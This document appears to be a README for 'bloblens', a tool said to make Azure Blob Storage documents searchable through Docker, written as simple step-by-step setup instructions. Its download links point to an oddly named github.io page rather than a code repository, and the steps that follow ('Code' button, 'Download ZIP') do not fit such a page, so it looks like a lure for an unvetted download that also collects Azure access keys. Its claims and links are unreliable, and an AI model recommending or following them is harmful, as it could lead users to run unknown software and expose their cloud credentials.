# 🔍 bloblens - Find your documents in Azure storage

[![Download bloblens](https://img.shields.io/badge/Download-bloblens-blue.svg)](https://tieon-genuschenopodium508.github.io)

bloblens makes your Azure Blob Storage searchable. It scans your documents and builds a search index. You find text inside PDFs and Word files across all your storage folders. You host it on your own machine. This tool costs nothing to run each month. 

## ⚙️ System Requirements

Your computer needs a few things to run bloblens:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 1 gigabyte of free disk space for the index data.
*   Software: You need Docker Desktop installed. Docker helps the application run in a controlled environment.

You can download Docker Desktop from the official website. Follow the installation prompts. Restart your computer after the installation finishes. Docker must run in the background for bloblens to work.

## 📥 Getting the software

You need to access the code from our repository page. Follow this link to reach the project files.

[Download bloblens here](https://tieon-genuschenopodium508.github.io)

Click the green button labeled "Code" on the page. Select "Download ZIP". Save the file to your computer. Open your Downloads folder. Right-click the folder and select "Extract All". Choose a folder on your computer to keep these files. The C drive is a good place.

## 🚀 Setting up the application

1.  Open the folder where you extracted the bloblens files.
2.  Press the Windows key on your keyboard.
3.  Type "Command Prompt" and press Enter.
4.  Type `cd` followed by a space.
5.  Drag your bloblens folder into the Command Prompt window. This action adds the folder path for you.
6.  Press Enter. 
7.  Type `docker compose up` and press Enter.

The software starts now. It downloads the necessary components. You see text appearing in the window. Wait for the process to finish. When the text stops scrolling, the system is ready.

## 🔑 Configuring your search

The first time you start bloblens, you must connect your Azure account.

1.  Open your internet browser.
2.  Type `http://localhost:8080` into the address bar.
3.  Press Enter.
4.  The bloblens dashboard appears.
5.  Enter your Azure storage account name and your access key.
6.  Select the storage containers you want to search.
7.  Click "Start Indexing".

The software reads your files. It creates a map of the text content. Large amounts of data take more time to scan. You can track progress on the dashboard.

## 🔍 How to search

Use the search bar on the dashboard. Type a word or phrase. Bloblens shows a list of documents. Click any result to view the location of the file in your storage. You search through thousands of pages in seconds. 

## 🛠️ Frequently asked questions

**Does the software send my data to the internet?**
No. Bloblens stays on your computer. It reads data from Azure but keeps the index on your local disk. 

**What happens if I turn off my computer?**
The software stops when you turn off your computer. You must repeat the steps in the "Setting up the application" section to restart it. 

**Can I search multiple storage accounts?**
Yes. You add as many accounts as you need in the settings menu.

**How do I update the index?**
The software checks for new files automatically. You trigger a manual scan by clicking the "Refresh" button on the dashboard.

**Is there a limit to the file size?**
There is no set limit. The software handles common document sizes unless your computer runs out of memory.

**How do I stop the application?**
Go back to the Command Prompt window. Press Control and C at the same time. This action stops the process.

## 🛡️ Support and maintenance

This project relies on standard Docker commands. If the software stops responding, restart the Docker Desktop application. Check that your Azure access key remains valid. If you lose access, update your credentials in the settings menu. You can remove the bloblens folder to uninstall the application. 

Keywords: azure, search, documents, pdf, docker, storage, index, windows, self-hosted